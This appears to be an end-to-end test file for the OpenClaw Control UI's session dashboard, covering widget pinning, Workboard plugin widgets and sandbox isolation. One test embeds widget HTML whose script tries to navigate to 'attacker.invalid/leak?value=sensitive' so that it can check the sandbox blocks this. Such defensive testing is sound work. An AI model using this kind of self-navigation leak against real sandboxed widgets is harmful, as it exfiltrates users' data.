// Control UI E2E covers the real session-dashboard provider and transcript bridge.
import { mkdir } from "node:fs/promises";
import path from "node:path";
import { WORKBOARD_STATUSES, type WorkboardCard } from "@openclaw/workboard-contract";
import type { Page } from "playwright";
import { expect, it } from "vitest";
import { GATEWAY_SERVER_CAPS } from "../../../packages/gateway-protocol/src/index.js";
import { SANDBOX_HOST_PATH } from "../../../src/agents/sandbox-host.js";
import { buildWidgetDocument } from "../../../src/canvas/wrap.js";
import { createSandboxHostHttpServer } from "../../../src/gateway/mcp-app-sandbox-http.js";
import {
  controlUiBundledSettingsStorageKey,
  controlUiSessionUrl,
  installMockGateway,
} from "../test-helpers/control-ui-e2e.ts";
import { workboardUi } from "../test-helpers/control-ui-workboard-fixture.ts";
import { useCanvasSandboxFixture } from "./canvas-sandbox.test-support.ts";
import {
  dockChatSidePanel,
  focusChatSidePanel,
  restoreChatAsMain,
} from "./chat-side-panel.test-support.ts";
import { createControlUiE2eSuite } from "./control-ui-e2e-suite.test-support.ts";
import { assertDashboardToolPresentation } from "./dashboard-presentation.test-support.ts";
import {
  boardSnapshot,
  pinnedBoardSnapshot,
  pinnedMcpAppBoardSnapshot,
  pluginWidgetBoardSnapshot,
  sessionKey,
} from "./session-dashboard.test-support.ts";

const suite = createControlUiE2eSuite({
  name: "Control UI session dashboard stitch",
  startServerBeforeBrowser: true,
});

async function showDashboard(page: Page): Promise<void> {
  const settingsKey = controlUiBundledSettingsStorageKey(suite.server.baseUrl);
  await page.addInitScript(
    ({ key, storageKey }) => {
      const settings = JSON.parse(localStorage.getItem(storageKey) ?? "{}") as Record<
        string,
        unknown
      >;
      const boardSessionViews =
        settings.boardSessionViews && typeof settings.boardSessionViews === "object"
          ? (settings.boardSessionViews as Record<string, unknown>)
          : {};
      const savedView = boardSessionViews[key];
      settings.boardSessionViews = {
        ...boardSessionViews,
        [key]: {
          activeTabId: "main",
          ...(savedView && typeof savedView === "object" ? savedView : {}),
        },
      };
      localStorage.setItem(storageKey, JSON.stringify(settings));
    },
    { key: sessionKey, storageKey: settingsKey },
  );
}

async function createProofContext(name: string) {
  const recordProof = process.env.OPENCLAW_UI_E2E_RECORD === "1";
  const proofDir = recordProof ? path.join(suite.artifactDir, name) : undefined;
  if (proofDir) {
    await mkdir(proofDir, { recursive: true });
  }
  const viewport = { height: 900, width: 1280 };
  const context = await suite.browser.newContext({
    viewport,
    ...(proofDir ? { recordVideo: { dir: proofDir, size: viewport } } : {}),
  });
  return { context, recordProof };
}

function workboardConfigSnapshot(enabled = true) {
  const config = { plugins: { entries: { workboard: { enabled } } } };
  return {
    config,
    hash: "workboard-cardboard-e2e",
    path: "/tmp/openclaw-e2e/openclaw.json",
    raw: JSON.stringify(config),
    resolved: config,
    sourceConfig: config,
  };
}

function workboardCardsListResponse(cards: WorkboardCard[]) {
  return {
    cards,
    boards: [
      { id: "platform", total: cards.length, active: cards.length, archived: 0, byStatus: {} },
    ],
    statuses: WORKBOARD_STATUSES,
  };
}

suite.define(() => {
  const canvasView = useCanvasSandboxFixture();
  it("keeps widget documents in standards mode and cancels self-navigation", async () => {
    const sandboxHost = createSandboxHostHttpServer();
    await new Promise<void>((resolve, reject) => {
      sandboxHost.once("error", reject);
      sandboxHost.listen(0, "127.0.0.1", () => {
        sandboxHost.off("error", reject);
        resolve();
      });
    });
    const sandboxAddress = sandboxHost.address();
    if (!sandboxAddress || typeof sandboxAddress === "string") {
      throw new Error("sandbox host did not bind a TCP address");
    }
    const context = await suite.browser.newContext();
    try {
      const page = await context.newPage();
      const escapeRequests: string[] = [];
      page.on("request", (request) => {
        if (request.url().startsWith("https://attacker.invalid/")) {
          escapeRequests.push(request.url());
        }
      });
      await page.goto(suite.server.baseUrl);
      await page.evaluate((sandboxUrl) => {
        Reflect.set(globalThis, "widgetProbes", []);
        addEventListener("message", (event) => {
          (Reflect.get(globalThis, "widgetProbes") as unknown[]).push(event.data);
        });
        const frame = document.createElement("iframe");
        frame.src = sandboxUrl;
        document.body.replaceChildren(frame);
      }, `http://127.0.0.1:${sandboxAddress.port}${SANDBOX_HOST_PATH}`);
      await expect
        .poll(async () =>
          page.evaluate(() =>
            (Reflect.get(globalThis, "widgetProbes") as Array<{ method?: string }>).some(
              (probe) => probe?.method === "ui/notifications/sandbox-proxy-ready",
            ),
          ),
        )
        .toBe(true);

      const widgetHtml = `<!doctype html><html><body><script>
        parent.postMessage({
          compatMode: document.compatMode,
        }, "*");
        setTimeout(() => {
          location.href = "https://attacker.invalid/leak?value=sensitive";
        }, 0);
      </script></body></html>`;
      await page.locator("iframe").evaluate((frame, html) => {
        (frame as HTMLIFrameElement).contentWindow?.postMessage(
          {
            method: "ui/notifications/sandbox-resource-ready",
            params: { html },
          },
          "*",
        );
      }, widgetHtml);
      await expect
        .poll(async () =>
          page.evaluate(() =>
            (
              Reflect.get(globalThis, "widgetProbes") as Array<{
                compatMode?: string;
              }>
            ).filter((probe) => probe?.compatMode),
          ),
        )
        .toEqual([{ compatMode: "CSS1Compat" }]);
      const sandboxFrame = await page
        .locator("iframe")
        .elementHandle()
        .then((handle) => handle?.contentFrame());
      const widgetFrame = sandboxFrame?.childFrames()[0];
      expect(widgetFrame).toBeDefined();
      await page.waitForTimeout(250);
      expect(widgetFrame!.url()).not.toContain("attacker.invalid");
      expect(escapeRequests).toEqual([]);
    } finally {
      await context.close();
      await new Promise<void>((resolve, reject) => {
        sandboxHost.close((error) => (error ? reject(error) : resolve()));
      });
    }
  });

  it("pins Canvas HTML, follows board commands, and switches dashboard panel width", async () => {
    const { context, recordProof } = await createProofContext("workboard-pin");
    const page = await context.newPage();
    const gateway = await installMockGateway(page, {
      sessionKey,
      featureCapabilities: [GATEWAY_SERVER_CAPS.BOARD_WIDGET_PUT_CANVAS_DOC],
      featureMethods: [
        "board.get",
        "board.update",
        "board.widget.grant",
        "board.widget.put",
        "chat.metadata",
        "chat.startup",
      ],
      historyMessages: [
        {
          role: "assistant",
          content: [
            {
              type: "canvas",
              preview: {
                kind: "canvas",
                surface: "assistant_message",
                render: "url",
                title: "Release status",
                viewId: "cv_release",
                url: "/__openclaw__/canvas/documents/cv_release/index.html",
                preferredHeight: 240,
                sandbox: "scripts",
              },
            },
          ],
          timestamp: 1,
        },
      ],
      methodResponses: {
        "canvas.document.view": canvasView(
          buildWidgetDocument("Release status", "<p>Release status</p>"),
        ),
        "board.get": boardSnapshot,
        "board.widget.put": pinnedBoardSnapshot,
      },
    });
    await showDashboard(page);

    await page.goto(controlUiSessionUrl(suite.server.baseUrl, sessionKey, "dashboard"));
    await expect
      .poll(async () => (await gateway.getRequests("board.get")).length, { timeout: 30_000 })
      .toBeGreaterThan(0);
    await page.locator('[data-panel-slot="dashboard"]').waitFor();
    await page.locator(".board-session-surface").waitFor();
    await page.locator(".chat-thread").waitFor();
    if (recordProof) {
      await page.screenshot({
        path: path.join(suite.artifactDir, "workboard-pin", "03-direct-route.png"),
      });
    }

    await dockChatSidePanel(page, "bottom");
    await expect.poll(() => page.locator(".sidebar-region--bottom").count()).toBe(1);
    await expect.poll(() => page.locator(".board-session-surface").isVisible()).toBe(true);
    if (recordProof) {
      await page.screenshot({
        path: path.join(suite.artifactDir, "workboard-pin", "04-bottom-dock.png"),
      });
    }

    const preview = page.locator('.chat-tool-card__preview[data-kind="canvas"]');
    const previewBubble = page.locator(".chat-bubble", { has: preview });
    const widgetActions = preview.locator("[data-widget-actions]");
    await expect.poll(() => preview.locator(".chat-tool-card__preview-header").count()).toBe(0);
    await expect
      .poll(() =>
        preview
          .locator(".chat-tool-card__preview-panel")
          .evaluate((element) => getComputedStyle(element).padding),
      )
      .toBe("0px");
    await expect
      .poll(() =>
        preview.evaluate((element) => {
          const actions = element.querySelector(".chat-tool-card__preview-actions");
          return actions
            ? actions.getBoundingClientRect().bottom <= element.getBoundingClientRect().top
            : false;
        }),
      )
      .toBe(true);
    await expect
      .poll(() =>
        preview
          .locator(".chat-tool-card__preview-frame")
          .evaluate((element) => getComputedStyle(element).borderTopWidth),
      )
      .toBe("0px");
    if (recordProof) {
      await widgetActions.hover();
      await expect
        .poll(() => widgetActions.evaluate((element) => getComputedStyle(element).opacity))
        .toBe("1");
      await previewBubble.screenshot({
        path: path.join(suite.artifactDir, "workboard-pin", "01-pin-hover.png"),
      });
    }
    await preview.getByRole("button", { name: "Pin to dashboard" }).click();
    await expect.poll(async () => (await gateway.getRequests("board.widget.put")).length).toBe(1);
    expect((await gateway.getRequests("board.widget.put"))[0]?.params).toEqual({
      sessionKey,
      agentId: "main",
      name: "canvas-cv_release",
      title: "Release status",
      content: { kind: "canvas-doc", docId: "cv_release" },
    });
    await expect
      .poll(() => preview.getByRole("button", { name: "Pinned" }).isDisabled())
      .toBe(true);
    if (recordProof) {
      await previewBubble.screenshot({
        path: path.join(suite.artifactDir, "workboard-pin", "02-pinned.png"),
      });
    }
    await gateway.setMethodResponse("board.get", pinnedBoardSnapshot);

    await gateway.emitGatewayEvent("board.command", {
      sessionKey,
      command: { kind: "focus_tab", tabId: "research" },
    });
    const researchTab = page.locator('[data-board-tab-id="research"]');
    await expect.poll(() => researchTab.getAttribute("active")).not.toBeNull();

    await assertDashboardToolPresentation({
      page,
      gateway,
      sessionKey,
      proofDir: recordProof ? path.join(suite.artifactDir, "workboard-pin") : undefined,
    });

    await restoreChatAsMain(page);
    await focusChatSidePanel(page);
    await expect.poll(() => page.locator(".sidebar-region--expanded").count()).toBe(1);
    await page.getByRole("button", { name: "Restore split", exact: true }).click();
    await expect.poll(() => page.locator(".sidebar-region--expanded").count()).toBe(0);
    await expect.poll(() => page.locator(".sidebar-region--bottom").count()).toBe(1);
    await expect
      .poll(() =>
        page.locator('.chat-tool-card__preview[data-kind="canvas"] [data-pin-widget]').isDisabled(),
      )
      .toBe(true);
    if (recordProof) {
      await page.screenshot({
        path: path.join(suite.artifactDir, "workboard-pin", "05-collapsed-bottom.png"),
      });
    }
    await restoreChatAsMain(page);
    await page.locator('[data-region-header="side"] .side-panel__minimize').click();
    await expect.poll(() => page.locator(".board-session-surface").isVisible()).toBe(false);
    await page.locator(".chat-thread").waitFor();
    if (recordProof) {
      await page.screenshot({
        path: path.join(suite.artifactDir, "workboard-pin", "06-chat-only.png"),
      });
    }
    await context.close();
  });

  it("shows a bounded visible outcome when a Canvas dashboard pin fails", async () => {
    const { context, recordProof } = await createProofContext("workboard-pin-failure");
    const page = await context.newPage();
    const gateway = await installMockGateway(page, {
      sessionKey,
      featureCapabilities: [GATEWAY_SERVER_CAPS.BOARD_WIDGET_PUT_CANVAS_DOC],
      featureMethods: [
        "board.get",
        "board.update",
        "board.widget.grant",
        "board.widget.put",
        "chat.metadata",
        "chat.startup",
      ],
      historyMessages: [
        {
          role: "assistant",
          content: [
            {
              type: "canvas",
              preview: {
                kind: "canvas",
                surface: "assistant_message",
                render: "url",
                title: "Stale release status",
                viewId: "cv_stale",
                url: "/__openclaw__/canvas/documents/cv_stale/index.html",
                preferredHeight: 240,
                sandbox: "scripts",
              },
            },
          ],
          timestamp: 1,
        },
      ],
      methodResponses: {
        "canvas.document.view": canvasView(
          buildWidgetDocument("Stale release status", "<p>Stale release status</p>"),
        ),
        "board.get": boardSnapshot,
        "board.widget.put": {
          __mockError: {
            code: "NOT_FOUND",
            message: `internal path detail ${"x".repeat(8_000)}`,
          },
        },
      },
    });
    await showDashboard(page);

    await page.goto(controlUiSessionUrl(suite.server.baseUrl, sessionKey, "dashboard"));
    await page.locator(".board-session-surface").waitFor();
    const preview = page.locator('.chat-tool-card__preview[data-kind="canvas"]');
    const pin = preview.getByRole("button", { name: "Pin to dashboard" });
    await preview.hover();
    await pin.click();

    await expect.poll(async () => (await gateway.getRequests("board.widget.put")).length).toBe(1);
    const toast = page.locator("openclaw-toast-host .app-toast");
    await toast.waitFor();
    expect(await toast.textContent()).toContain("Could not pin to dashboard. Try again.");
    expect(await pin.isEnabled()).toBe(true);
    await page.mouse.move(0, 0);
    await pin.hover();
    const hint = page.locator("wa-tooltip[open]");
    await hint.locator('[part="body"]').waitFor({ state: "visible" });
    expect(await hint.textContent()).toContain("Could not pin to dashboard. Try again.");
    expect(await page.getByText("internal path detail", { exact: false }).count()).toBe(0);
    if (recordProof) {
      await page.screenshot({
        path: path.join(suite.artifactDir, "workboard-pin-failure", "pin-failed.png"),
      });
    }
    await context.close();
  });

  it("pins an inline MCP App using only its session-bound view identity", async () => {
    const context = await suite.browser.newContext({ viewport: { height: 900, width: 1280 } });
    const page = await context.newPage();
    const gateway = await installMockGateway(page, {
      sessionKey,
      featureCapabilities: [],
      featureMethods: [
        "board.get",
        "board.widget.appView",
        "board.widget.put",
        "chat.metadata",
        "chat.startup",
      ],
      historyMessages: [
        {
          role: "assistant",
          content: [
            {
              type: "canvas",
              preview: {
                kind: "canvas",
                surface: "assistant_message",
                render: "url",
                title: "Demo App",
                viewId: "outer-view-must-not-be-pinned",
                mcpApp: {
                  viewId: "view-session-bound",
                  serverName: "forbidden-server",
                  toolName: "forbidden-tool",
                  uiResourceUri: "ui://forbidden/app.html",
                  originSessionKey: sessionKey,
                  toolCallId: "forbidden-call",
                },
              },
            },
          ],
          timestamp: 1,
        },
      ],
      methodResponses: {
        "board.get": boardSnapshot,
        "board.widget.appView": {
          viewId: "view-pinned-lease",
          expiresAtMs: Date.now() + 60_000,
        },
        "board.widget.put": pinnedMcpAppBoardSnapshot,
      },
    });
    await showDashboard(page);

    await page.goto(controlUiSessionUrl(suite.server.baseUrl, sessionKey, "dashboard"));
    await page.locator(".board-session-surface").waitFor();
    const preview = page.locator('.chat-tool-card__preview[data-kind="canvas"]');
    await preview.hover();
    await preview.getByRole("button", { name: "Pin to dashboard" }).click();

    await expect.poll(async () => (await gateway.getRequests("board.widget.put")).length).toBe(1);
    expect((await gateway.getRequests("board.widget.put"))[0]?.params).toEqual({
      sessionKey,
      agentId: "main",
      name: "mcp-app-28b65635ecaa78ac",
      title: "Demo App",
      content: { kind: "mcp-app", viewId: "view-session-bound" },
    });
    await expect
      .poll(() => preview.getByRole("button", { name: "Pinned" }).isDisabled())
      .toBe(true);
    await context.close();
  });

  it("renders and updates active Workboard plugin widgets", async () => {
    const { context, recordProof } = await createProofContext("workboard-plugin-widgets");
    const page = await context.newPage();
    const readyCard: WorkboardCard = {
      id: "card-widget-ready",
      title: "Rebase plugin widget kinds",
      sessionKey,
      status: "ready",
      priority: "high",
      labels: ["dashboard"],
      position: 1_000,
      createdAt: 1,
      updatedAt: 2,
      agentId: "main",
      metadata: { automation: { boardId: "platform" } },
    };
    const refreshedCard = {
      ...readyCard,
      title: "Refreshed while the dashboard is hidden",
      updatedAt: 3,
    };
    const runningCard: WorkboardCard = {
      ...refreshedCard,
      status: "running",
      position: 2_000,
      updatedAt: 4,
    };
    const alreadyRunningCard: WorkboardCard = {
      ...readyCard,
      id: "card-widget-running",
      title: "Already running",
      sessionKey: undefined,
      status: "running",
      position: 1_000,
    };
    const gateway = await installMockGateway(page, {
      ...workboardUi,
      sessionKey,
      controlUiWidgetKinds: [
        { pluginId: "workboard", kind: "workboard:card", label: "Workboard card" },
        { pluginId: "workboard", kind: "workboard:mini", label: "Workboard summary" },
      ],
      featureMethods: [
        "board.get",
        "chat.metadata",
        "chat.startup",
        "sessions.patch",
        "workboard.cards.list",
        "workboard.cards.move",
      ],
      methodResponses: {
        "board.get": pluginWidgetBoardSnapshot,
        "workboard.cards.list": workboardCardsListResponse([readyCard, alreadyRunningCard]),
        "workboard.cards.move": { card: runningCard },
      },
    });
    await showDashboard(page);

    try {
      await page.goto(controlUiSessionUrl(suite.server.baseUrl, sessionKey, "dashboard"));
      const cardWidget = page.locator('[data-test-id="workboard-card-widget"]');
      const miniWidget = page.locator('[data-test-id="workboard-mini-widget"]');
      await cardWidget.waitFor();
      await miniWidget.waitFor();
      await expect.poll(() => cardWidget.textContent()).toContain("Rebase plugin widget kinds");
      await expect.poll(() => miniWidget.textContent()).toContain("Already running");
      const accessory = page.locator(".workboard-session-chip");
      await expect.poll(() => accessory.textContent()).toContain(readyCard.title);
      expect(
        new URL(
          (await miniWidget.getByRole("link", { name: "Open board" }).getAttribute("href"))!,
          suite.server.baseUrl,
        ).pathname,
      ).toBe("/workboard/platform");
      if (recordProof) {
        await page.screenshot({
          path: path.join(
            suite.artifactDir,
            "workboard-plugin-widgets",
            "01-plugin-widgets-ready.png",
          ),
        });
      }

      const nativeCardView = page.locator("openclaw-plugin-view").filter({ has: cardWidget });
      const cardElement = await nativeCardView.elementHandle();
      expect(cardElement).not.toBeNull();
      await cardElement?.evaluate((element) => {
        Reflect.set(globalThis, "workboardPluginElementIdentity", element);
      });
      const expectRetainedCardView = async (presented: boolean) => {
        await expect
          .poll(() =>
            nativeCardView.evaluate(
              (element, visible) =>
                element === Reflect.get(globalThis, "workboardPluginElementIdentity") &&
                element.isConnected &&
                Reflect.get(element, "presented") === visible,
              presented,
            ),
          )
          .toBe(true);
      };
      await focusChatSidePanel(page);
      await expectRetainedCardView(true);
      await page.getByRole("button", { name: "Restore split", exact: true }).click();
      await restoreChatAsMain(page);
      const listCountBeforeHide = (await gateway.getRequests("workboard.cards.list")).length;
      await page.locator('[data-region-header="side"] .side-panel__minimize').click();
      await expect.poll(() => page.locator(".board-session-surface").isVisible()).toBe(false);
      await expectRetainedCardView(false);
      await gateway.setMethodResponse(
        "workboard.cards.list",
        workboardCardsListResponse([refreshedCard, alreadyRunningCard]),
      );
      await gateway.emitGatewayEvent("plugin.workboard.changed", {
        epoch: "plugin-widget-e2e-hidden",
        revision: 2,
      });
      await expect.poll(() => accessory.textContent()).toContain(refreshedCard.title);
      await page.evaluate(
        () =>
          new Promise<void>((resolve) => {
            requestAnimationFrame(() => requestAnimationFrame(() => resolve()));
          }),
      );
      // The visible chat header refreshes its catalog; retained dashboard widgets stay paused.
      expect(await gateway.getRequests("workboard.cards.list")).toHaveLength(
        listCountBeforeHide + 1,
      );
      expect(await cardWidget.count()).toBe(1);

      await gateway.emitGatewayEvent("board.command", {
        sessionKey,
        command: { kind: "focus_tab", tabId: "main" },
      });
      // Both resumed widget views share one read; the visible header keeps its current lookup.
      await expect
        .poll(async () => (await gateway.getRequests("workboard.cards.list")).length)
        .toBe(listCountBeforeHide + 2);
      await expect.poll(() => cardWidget.textContent()).toContain(refreshedCard.title);
      await expect.poll(() => accessory.textContent()).toContain(refreshedCard.title);
      await expectRetainedCardView(true);

      await cardWidget.getByRole("combobox").selectOption("running");
      const moveRequest = await gateway.waitForRequest("workboard.cards.move");
      expect(moveRequest.params).toEqual({
        id: "card-widget-ready",
        status: "running",
        position: 2_000,
      });
      await expect.poll(() => cardWidget.textContent()).toContain("Running");
      await gateway.setMethodResponse(
        "workboard.cards.list",
        workboardCardsListResponse([runningCard, alreadyRunningCard]),
      );
      await gateway.emitGatewayEvent("plugin.workboard.changed", {
        epoch: "plugin-widget-e2e",
        revision: 2,
      });
      await expect
        .poll(async () =>
          (await miniWidget.locator('[title="Running"]').textContent())
            ?.replace(/\s+/gu, " ")
            .trim(),
        )
        .toBe("2 Running");
      if (recordProof) {
        await page.screenshot({
          path: path.join(
            suite.artifactDir,
            "workboard-plugin-widgets",
            "02-plugin-widgets-running.png",
          ),
        });
      }
    } finally {
      const video = page.video();
      await context.close();
      if (recordProof && video) {
        await video.saveAs(
          path.join(suite.artifactDir, "workboard-plugin-widgets", "workboard-plugin-widgets.webm"),
        );
      }
    }
  });

  it("keeps a read-only Workboard dashboard card visible without allowing status changes", async () => {
    await suite.withPage({ viewport: { height: 900, width: 1280 } }, async ({ page }) => {
      const widgetKinds = [
        { pluginId: "workboard", kind: "workboard:card", label: "Workboard card" },
        { pluginId: "workboard", kind: "workboard:mini", label: "Workboard summary" },
      ];
      const methods = [
        "board.get",
        "chat.metadata",
        "chat.startup",
        "workboard.cards.list",
        "workboard.cards.move",
      ];
      const card: WorkboardCard = {
        id: "card-widget-ready",
        title: "Read-only dashboard card",
        status: "ready",
        priority: "high",
        labels: ["dashboard"],
        position: 1,
        createdAt: 1,
        updatedAt: 2,
        agentId: "main",
        metadata: { automation: { boardId: "platform" } },
      };
      const gateway = await installMockGateway(page, {
        ...workboardUi,
        controlUiWidgetKinds: widgetKinds,
        featureMethods: methods,
        operatorScopes: ["operator.read"],
        sessionKey,
        methodResponses: {
          "board.get": pluginWidgetBoardSnapshot,
          "workboard.cards.list": workboardCardsListResponse([card]),
        },
      });
      await showDashboard(page);

      await page.goto(controlUiSessionUrl(suite.server.baseUrl, sessionKey, "dashboard"));
      const cardWidget = page.locator('[data-test-id="workboard-card-widget"]');
      await cardWidget.waitFor();
      await expect.poll(() => cardWidget.textContent()).toContain(card.title);
      const status = cardWidget.getByRole("combobox");
      await expect.poll(() => status.isDisabled()).toBe(true);
      await status.evaluate((select) => {
        (select as HTMLSelectElement).value = "running";
        select.dispatchEvent(new Event("change", { bubbles: true }));
      });
      expect(await gateway.getRequests("workboard.cards.move")).toHaveLength(0);
    });
  });

  it("links a dispatched Workboard card and its live session dashboard in both directions", async () => {
    const { context, recordProof } = await createProofContext("workboard-cardboard");
    const page = await context.newPage();
    const card: WorkboardCard = {
      id: "card-dashboard-stitch",
      title: "Ship dashboard stitch",
      status: "running",
      priority: "high",
      labels: ["ui"],
      position: 1000,
      createdAt: 1,
      updatedAt: 2,
      sessionKey,
      runId: "run-dashboard-stitch",
      metadata: { automation: { boardId: "platform" } },
    };
    const gateway = await installMockGateway(page, {
      ...workboardUi,
      sessionKey,
      featureMethods: [
        "board.get",
        "chat.metadata",
        "chat.startup",
        "config.get",
        "sessions.list",
        "tasks.list",
        "workboard.cards.list",
      ],
      methodResponses: {
        "board.get": boardSnapshot,
        "config.get": workboardConfigSnapshot(),
        "tasks.list": { nextCursor: null, tasks: [] },
        "workboard.cards.list": workboardCardsListResponse([card]),
      },
    });
    await showDashboard(page);

    try {
      await page.goto(controlUiSessionUrl(suite.server.baseUrl, sessionKey, "dashboard"));
      const chip = page.locator(".workboard-session-chip");
      await chip.waitFor();
      await expect.poll(() => chip.textContent()).toContain("Ship dashboard stitch");
      await expect.poll(() => chip.textContent()).toContain("Running");
      expect(new URL((await chip.getAttribute("href"))!, suite.server.baseUrl).pathname).toBe(
        "/workboard/platform",
      );
      if (recordProof) {
        await page.screenshot({
          path: path.join(suite.artifactDir, "workboard-cardboard", "01-dashboard-card-chip.png"),
        });
      }

      const completedCard: WorkboardCard = { ...card, status: "done", updatedAt: 3 };
      await gateway.setMethodResponse(
        "workboard.cards.list",
        workboardCardsListResponse([completedCard]),
      );
      await gateway.emitGatewayEvent("plugin.workboard.changed", {
        epoch: "cardboard-e2e",
        revision: 2,
      });
      await expect.poll(() => chip.textContent()).toContain("Done");

      await gateway.setMethodResponse("workboard.cards.list", workboardCardsListResponse([]));
      await gateway.emitGatewayEvent("plugin.workboard.changed", {
        epoch: "cardboard-e2e",
        revision: 3,
      });
      await expect.poll(() => chip.count()).toBe(0);

      await gateway.setMethodResponse(
        "workboard.cards.list",
        workboardCardsListResponse([completedCard]),
      );
      await gateway.emitGatewayEvent("plugin.workboard.changed", {
        epoch: "cardboard-e2e",
        revision: 4,
      });
      await chip.waitFor();

      await chip.click();
      await page.waitForURL((url) => url.pathname === "/workboard/platform");
      const workboardCard = page.locator(".workboard-card", {
        hasText: "Ship dashboard stitch",
      });
      await workboardCard.waitFor();
      await workboardCard.click();
      const cardDashboard = page.locator("openclaw-plugin-session-dashboard");
      await cardDashboard.waitFor();
      await expect
        .poll(() =>
          cardDashboard.locator(".plugin-session-dashboard__toggle").getAttribute("aria-expanded"),
        )
        .toBe("true");
      await cardDashboard.locator("openclaw-board-view").waitFor();
      if (recordProof) {
        await page.screenshot({
          path: path.join(
            suite.artifactDir,
            "workboard-cardboard",
            "02-workboard-card-dashboard.png",
          ),
        });
      }

      await gateway.setMethodResponse("board.get", {
        sessionKey,
        revision: 3,
        tabs: [],
        widgets: [],
      });
      await gateway.emitGatewayEvent("board.changed", { sessionKey });
      await cardDashboard.getByText("This session has no dashboard widgets yet.").waitFor();
    } finally {
      const video = page.video();
      await context.close();
      if (recordProof && video) {
        await video.saveAs(
          path.join(suite.artifactDir, "workboard-cardboard", "workboard-cardboard.webm"),
        );
      }
    }
  });

  it("links Workboard cards without dashboard widgets and omits the disabled plugin", async () => {
    const cases = [
      {
        name: "plugin disabled",
        native: false,
        board: boardSnapshot,
        config: workboardConfigSnapshot(false),
      },
      {
        name: "board empty",
        native: true,
        board: { sessionKey, revision: 1, tabs: [], widgets: [] },
        config: workboardConfigSnapshot(),
      },
    ];

    for (const testCase of cases) {
      await suite.withPage({ viewport: { height: 900, width: 1280 } }, async ({ page }) => {
        const gateway = await installMockGateway(page, {
          ...(testCase.native ? workboardUi : {}),
          sessionKey,
          featureMethods: [
            "board.get",
            "chat.metadata",
            "chat.startup",
            "config.get",
            "workboard.cards.list",
          ],
          methodResponses: {
            "board.get": testCase.board,
            "config.get": testCase.config,
            "workboard.cards.list": workboardCardsListResponse([
              {
                id: `card-${testCase.name.replaceAll(" ", "-")}`,
                title: testCase.name,
                status: "running",
                priority: "normal",
                labels: [],
                position: 1,
                createdAt: 1,
                updatedAt: 2,
                sessionKey,
                metadata: { automation: { boardId: "platform" } },
              },
            ]),
          },
        });
        await showDashboard(page);

        await page.goto(controlUiSessionUrl(suite.server.baseUrl, sessionKey, "dashboard"));
        await expect
          .poll(async () => (await gateway.getRequests("board.get")).length)
          .toBeGreaterThan(0);
        const chip = page.locator(".workboard-session-chip");
        if (testCase.native) {
          await expect.poll(() => chip.textContent()).toContain(testCase.name);
          expect(new URL((await chip.getAttribute("href"))!, suite.server.baseUrl).pathname).toBe(
            "/workboard/platform",
          );
          expect(await gateway.getRequests("workboard.cards.list")).toHaveLength(1);
        } else {
          await expect.poll(() => chip.count()).toBe(0);
          expect(await gateway.getRequests("workboard.cards.list")).toHaveLength(0);
        }
      });
    }
  });
});
